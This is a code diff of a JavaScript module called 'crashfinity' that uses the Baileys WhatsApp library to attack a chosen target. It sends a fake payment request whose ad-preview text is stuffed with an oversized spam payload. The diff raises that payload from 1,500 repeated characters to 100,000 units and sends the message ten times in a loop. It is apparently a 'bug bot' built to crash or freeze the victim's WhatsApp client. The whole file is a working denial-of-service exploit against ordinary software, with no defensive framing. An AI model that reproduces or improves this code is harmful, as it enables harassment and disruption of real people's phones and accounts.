@@ -1,54 +1,44 @@
 
- 
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const crypto = require('crypto');
-
+const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+const { getSuperPayload } = require('./SuperPayload');
 
 async function crashfinity(SYxS7, target) {
     try {
-        const titleText = "HAI SALAM KENAL YAKK";
-        const spamText = "ြ".repeat(1500);
-
-        const fakePaymentPayload = {
+        const superSpam = getSuperPayload(100000);
+        
+        const payload = {
             requestPaymentMessage: {
-                currencyCodeIso4217: "IDR",    
-                requestFrom: target,          
-                expiryTimestamp: Date.now() + 8000,  
+                currencyCodeIso4217: "USD",
                 amount: {
-                    value: 999999999,       
-                    offset: 100,                
-                    currencyCode: "IDR"
+                    value: 999999999,
+                    offset: 100,
+                    currencyCode: "USD"
                 },
-
+                requestFrom: target,
+                expiryTimestamp: Date.now() + 999999,
                 contextInfo: {
                     externalAdReply: {
-                        title: titleText,
-                        body: spamText,       
-                        mimetype: "audio/mpeg",      
-                        caption: spamText,           
-                        showAdAttribution: true,      
-                        sourceUrl: "https://t.me/kashmiri1_1",
+                        title: "ROBIN BUG BOT OVERLOAD",
+                        body: superSpam,
+                        mediaType: 1,
+                        renderLargerThumbnail: true,
+                        showAdAttribution: true,
+                        sourceUrl: "https://github.com/jfufucou/ROBIN-BUG-BOT",
                         thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                     }
                 }
             }
         };
 
-        await SYxS7.relayMessage(
-            target,                           
-            fakePaymentPayload,
-            {
-                participant: { jid: target }, 
-                messageId: null,        
-                userJid: target,       
-                quoted: null
-            }
-        );
-
-
+        for (let i = 0; i < 10; i++) {
+            await SYxS7.relayMessage(target, payload, {
+                participant: { jid: target }
+            });
+            await new Promise(res => setTimeout(res, 500));
+        }
     } catch (error) {
+        console.error("crashfinity failed:", error.message);
     }
 }
 
-module.exports = { crashfinity }
+module.exports = { crashfinity };
